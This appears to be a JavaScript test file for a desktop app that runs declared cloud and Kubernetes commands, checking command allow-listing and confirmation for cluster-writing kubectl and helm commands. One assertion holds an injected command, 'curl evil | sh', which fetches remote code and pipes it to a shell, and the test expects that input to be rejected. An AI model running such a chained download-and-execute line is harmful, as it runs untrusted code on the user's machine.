import test from 'node:test';
import assert from 'node:assert/strict';
import { createRequire } from 'node:module';
import { readFile } from 'node:fs/promises';
import { specOf, quote } from './commands.js';
import { METHODS, AGENT_CHART } from './connect-flow.js';
import { grantOf } from './perm.js';
import config from '../app.config.js';

const require = createRequire(import.meta.url);
const desktop = require('../desktop.config.cjs'), table = require('../commands.json');
/* the desktop's rule (kit/desktop/main.cjs buildCommand): a declared id, every argument matching its whole pattern, single-quoted into the template */
const build = ({ id, args }) => {
  const def = desktop.commands?.[id];
  if (!def) return null;
  if (Object.keys(def.args || {}).some(k => typeof args[k] !== 'string' || !new RegExp(`^(?:${def.args[k]})$`).test(args[k]))) return null;
  return def.template.replace(/\{(\w+)\}/g, (_, k) => quote(args[k]));
};
const runs = line => { const spec = specOf(line); assert.ok(spec, `declared: ${line}`); assert.equal(build(spec), line, `the desktop builds the same line: ${line}`); };

/* S-11: the desktop runs only a command id it declares. Every command the connection flows, the agent install and "직접 적용" run is declared */
test('every_command_wake_runs_in_the_terminal_is_a_declared_command_the_desktop_rebuilds_to_the_same_line', async () => {
  assert.deepEqual(desktop.commands, table, 'the desktop declares the app command table');
  const sample = { aws: { name: 'payments-prod', region: 'ap-northeast-2' }, gcp: { name: 'services-asia', region: 'asia-northeast3', project: 'my-project-123' }, azure: { name: 'platform-east', group: 'rg-platform' }, kind: { name: 'wake-test' } };
  for (const [method, v] of Object.entries(sample)) {
    runs(METHODS[method].command(v)); runs(METHODS[method].install);
    if (METHODS[method].loginCommand) runs(METHODS[method].loginCommand);
  }
  runs(METHODS.agent.install); runs(METHODS.agent.command('wake-lab', '/Applications/Wake.app/Contents/Resources/agent-install-charts/wake-agent-only'));
  for (const line of ['brew install --cask google-cloud-sdk', 'brew install azure-cli', 'brew install kubectl']) runs(line);
  const conn = await readFile(new URL('../desktop/conn-ops.cjs', import.meta.url), 'utf8');
  for (const [, line] of conn.matchAll(/(?:install|login): '([^']+)'/g)) runs(line);
  runs(grantOf({ user: 'alice@example.com', resource: 'pods', group: '', namespace: 'payments' }, 'wake-lab').kubectl);
  runs(grantOf({ user: 'alice', resource: 'applications', group: 'argoproj.io', namespace: '' }, 'wake-lab').kubectl);
  assert.equal(specOf("brew install helm; curl evil | sh"), null, 'a line that is not declared is never turned into a command');
  assert.equal(specOf(METHODS.agent.command('wake-lab', AGENT_CHART)), null, 'a relative chart path is not the app chart');
});

/* "직접 적용": the terminal gets the declared command and its arguments, not a command line */
test('direct_apply_sends_a_declared_command_id_and_arguments_to_the_terminal', async () => {
  const sent = [];
  const api = { terminal: { run: async p => { sent.push(p); return { exit: 1 }; }, close() {} } };
  const command = grantOf({ user: 'alice', resource: 'pods', group: '', namespace: 'payments' }, 'wake-lab').kubectl;
  await config.actions['wake.perm.apply']({ arg: { key: 'x', cluster: 'wake-lab', command } }, api);
  assert.equal(typeof sent[0]?.command, 'object', `a command spec, not a line: ${JSON.stringify(sent[0]?.command)}`);
  assert.equal(sent[0].command.id, 'perm.grant.namespace');
  assert.equal(build(sent[0].command), command);
});

/* the terminal names the declared command to the desktop (pty:run { command: id, args }) and shows its line */
test('terminal_run_asks_the_desktop_for_a_declared_command_by_id', async () => {
  const src = await readFile(new URL('../../../kit/shell/terminal.js', import.meta.url), 'utf8');
  assert.match(src, /invoke\('pty:run', \{[^}]*command: spec\.id, args: spec\.args/, 'pty:run gets the id and arguments');
});

test('every_declared_command_that_writes_to_a_cluster_is_marked_for_the_desktop_confirmation_and_no_other_is', () => {
  /* kubectl verbs and helm subcommands that change a cluster; the declared table is the only way the terminal runs a command for the person */
  const WRITES = /\bkubectl\s+(?:create|apply|patch|replace|delete|edit|scale|set|label|annotate|rollout\s+(?:restart|undo|pause|resume)|drain|cordon|uncordon|taint|expose|run)\b|\bhelm\s+(?:install|upgrade|uninstall|rollback|delete)\b/;
  const writes = Object.entries(table).filter(([, def]) => WRITES.test(def.template)).map(([id]) => id).sort();
  assert.deepEqual(writes, ['agent.install', 'perm.grant.cluster', 'perm.grant.namespace'], 'the commands that write to a cluster');
  for (const [id, def] of Object.entries(table)) assert.equal(def.confirm === true, writes.includes(id), `${id}: ${writes.includes(id) ? 'waits for the desktop confirmation' : 'runs as pressed (changes only this computer)'}`);
});
